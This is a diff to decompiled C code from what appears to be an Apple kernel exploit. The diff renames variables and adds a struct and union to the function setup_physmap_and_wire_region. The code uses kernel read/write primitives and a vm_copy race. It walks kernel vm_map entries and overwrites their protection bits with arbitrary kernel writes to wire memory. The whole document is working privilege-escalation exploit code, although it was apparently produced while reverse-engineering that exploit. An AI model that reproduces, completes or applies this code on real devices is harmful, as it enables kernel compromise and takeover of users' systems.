@@ -1823,6 +1823,19 @@ typedef char csblob_walk_ctx_pid_offset_must_be_0x44[
 typedef char csblob_walk_ctx_min_slot_distance_offset_must_be_0x5c[
   __builtin_offsetof(struct csblob_walk_ctx, minSlotDistanceQword) == 0x5c ? 1 : -1];
 
+struct vm_map_entry_wire_snapshot
+{
+  uint64_t prev;
+  uint64_t next;
+  uint64_t field_0x10;
+  uint64_t start;
+  uint32_t pageQueueOrIndex;
+  uint32_t maxProtectionAndFlags;
+  uint32_t field_0x28;
+  uint16_t protectionBits;
+  uint16_t field_0x2e;
+};
+
 static const integer_t kVmcopyRaceLowPriorityPolicy[4] = { 0x20A51, 0x2710, 0x2711, 1 };
 static const integer_t kVmcopyRaceHighPriorityPolicy[4] = { 0x3E8, 0xF4240, 0xF4241, 1 };
 static const uint64_t kVmcopyFakePageMarkers[2] = { 0x43434343, 0x44444444 };
@@ -33459,11 +33472,11 @@ __int64 __fastcall setup_physmap_and_wire_region(
   int v19; // w8
   unsigned __int64 v20; // x0
   __int64 v22; // x19
-  unsigned __int64 v23; // x23
-  unsigned __int64 v24; // x8
-  unsigned __int64 v25; // x8
-  size_t v26; // x25
-  uint64_t *v27; // x27
+  unsigned __int64 vmPageSizeForTask; // x23
+  unsigned __int64 trailingBytes; // x8
+  unsigned __int64 paddedBytes; // x8
+  size_t pageCount; // x25
+  uint64_t *wiredEntries; // x27
   char v28; // w26
   __int64 v29; // x19
   int v31; // w2
@@ -33485,7 +33498,7 @@ __int64 __fastcall setup_physmap_and_wire_region(
   __int64 v48; // x19
   mach_vm_address_t *v49; // x25
   mach_vm_address_t v50; // t1
-  unsigned __int64 v51; // [xsp+10h] [xbp-130h]
+  unsigned __int64 roundedSize; // [xsp+10h] [xbp-130h]
   int v52; // [xsp+10h] [xbp-130h]
   vm_prot_t desired_access; // [xsp+18h] [xbp-128h]
   vm_prot_t desired_accessa; // [xsp+18h] [xbp-128h]
@@ -33498,14 +33511,10 @@ __int64 __fastcall setup_physmap_and_wire_region(
   mach_vm_address_t v61; // [xsp+38h] [xbp-108h] BYREF
   unsigned __int64 v62; // [xsp+40h] [xbp-100h] BYREF
   unsigned __int64 v63; // [xsp+48h] [xbp-F8h] BYREF
-  mach_vm_address_t address[2]; // [xsp+50h] [xbp-F0h] BYREF
-  __int128 v65; // [xsp+60h] [xbp-E0h]
-  __int128 v66; // [xsp+70h] [xbp-D0h]
-  __int128 v67; // [xsp+80h] [xbp-C0h]
-  __int128 v68; // [xsp+90h] [xbp-B0h]
-  __int128 v69; // [xsp+A0h] [xbp-A0h]
-  __int128 v70; // [xsp+B0h] [xbp-90h]
-  __int128 v71; // [xsp+C0h] [xbp-80h]
+  union {
+    mach_vm_address_t allocatedPages[16];
+    struct vm_map_entry_wire_snapshot mapEntry;
+  } scratch; // [xsp+50h] [xbp-F0h] BYREF
   uint32_t v72[2]; // [xsp+D8h] [xbp-68h] BYREF
 
   result = physmap_pgtable_check_and_append(krwCtx, a2);
@@ -33549,21 +33558,14 @@ LABEL_14:
               {
                 v52 = a7;
                 v56 = a6;
-                v70 = 0u;
-                v71 = 0u;
-                v68 = 0u;
-                v69 = 0u;
-                v66 = 0u;
-                v67 = 0u;
-                *(__int128 *)address = 0u;
-                v65 = 0u;
+                memset(&scratch, 0, sizeof(scratch));
                 v35 = vm_page_size;
                 v36 = mach_task_self_;
-                if ( mach_vm_allocate(mach_task_self_, address, vm_page_size, 9) )
+                if ( mach_vm_allocate(mach_task_self_, scratch.allocatedPages, vm_page_size, 9) )
                   return 0;
                 desired_accessa = a5;
                 v37 = 0;
-                v38 = &address[1];
+                v38 = &scratch.allocatedPages[1];
                 while ( 1 )
                 {
                   v39 = (uint32_t *)*(v38 - 1);
@@ -33598,7 +33600,7 @@ LABEL_14:
                 LODWORD(v37) = v37 + 1;
 LABEL_68:
                 v48 = (unsigned int)v37;
-                v49 = address;
+                v49 = scratch.allocatedPages;
                 a6 = v56;
                 do
                 {
@@ -33622,45 +33624,45 @@ LABEL_68:
               {
                 v22 = v20;
                 desired_access = a5;
-                v23 = v15;
-                v24 = a4 % v15;
-                if ( v24 )
-                  v25 = v15 - v24;
+                vmPageSizeForTask = v15;
+                trailingBytes = a4 % v15;
+                if ( trailingBytes )
+                  paddedBytes = v15 - trailingBytes;
                 else
-                  v25 = 0;
-                v51 = v25 + a4;
-                v26 = (v25 + a4) / v15;
-                result = (__int64)calloc(v26, 8u);
+                  paddedBytes = 0;
+                roundedSize = paddedBytes + a4;
+                pageCount = (paddedBytes + a4) / v15;
+                result = (__int64)calloc(pageCount, 8u);
                 if ( result )
                 {
-                  v27 = (uint64_t *)result;
+                  wiredEntries = (uint64_t *)result;
                   v55 = a6;
                   v28 = 0;
                   do
                   {
-                    if ( !(unsigned int)krw_read_thunk(krwCtx, v22, 48, address) )
+                    if ( !(unsigned int)krw_read_thunk(krwCtx, v22, 48, &scratch.mapEntry) )
                       goto LABEL_66;
                     if ( (v28 & 1) != 0 )
                     {
-                      if ( (uint32_t)v63 != (uint32_t)v66 )
+                      if ( (uint32_t)v63 != scratch.mapEntry.pageQueueOrIndex )
                         goto LABEL_66;
                     }
                     else
                     {
-                      LODWORD(v63) = v66;
+                      LODWORD(v63) = scratch.mapEntry.pageQueueOrIndex;
                     }
-                    v29 = *((uint64_t *)&v65 + 1);
-                    if ( *((uint64_t *)&v65 + 1) >= v60 && *((uint64_t *)&v65 + 1) < v60 + a4 )
+                    v29 = scratch.mapEntry.start;
+                    if ( scratch.mapEntry.start >= v60 && scratch.mapEntry.start < v60 + a4 )
                     {
-                      if ( (WORD6(v66) & 0x140) == 0 )
+                      if ( (scratch.mapEntry.protectionBits & 0x140) == 0 )
                         goto LABEL_66;
-                      v31 = a7 ? HIDWORD(v66) & ~v58 : (HIDWORD(v66) & v57) | v58;
+                      v31 = a7 ? scratch.mapEntry.maxProtectionAndFlags & ~v58 : (scratch.mapEntry.maxProtectionAndFlags & v57) | v58;
                       if ( !noppl_kwrite32(krwCtx, v61 + 44, v31) )
                         goto LABEL_66;
-                      v27[(v29 - v60) / v23] = v61;
+                      wiredEntries[(v29 - v60) / vmPageSizeForTask] = v61;
                     }
-                    v61 = address[1];
-                    v32 = port_right_index_to_kaddr(krwCtx, address[1]);
+                    v61 = scratch.mapEntry.next;
+                    v32 = port_right_index_to_kaddr(krwCtx, scratch.mapEntry.next);
                     v61 = v32;
                     if ( !v32 )
                       goto LABEL_66;
@@ -33668,23 +33670,23 @@ LABEL_68:
                     v28 = 1;
                   }
                   while ( v59 != v32 );
-                  if ( v51 >= v23 )
+                  if ( roundedSize >= vmPageSizeForTask )
                   {
                     v33 = 0;
-                    v34 = v26;
-                    if ( v26 <= 1 )
+                    v34 = pageCount;
+                    if ( pageCount <= 1 )
                       v34 = 1;
-                    while ( v27[v33] )
+                    while ( wiredEntries[v33] )
                     {
                       if ( ++v33 == v34 )
                         goto LABEL_47;
                     }
 LABEL_66:
-                    free(v27);
+                    free(wiredEntries);
                     return 0;
                   }
 LABEL_47:
-                  free(v27);
+                  free(wiredEntries);
                   if ( !v55 )
                     return 1;
                   return mach_vm_wire(krwCtx->hostPrivPort, a2, a3, a4, desired_access) == 0;
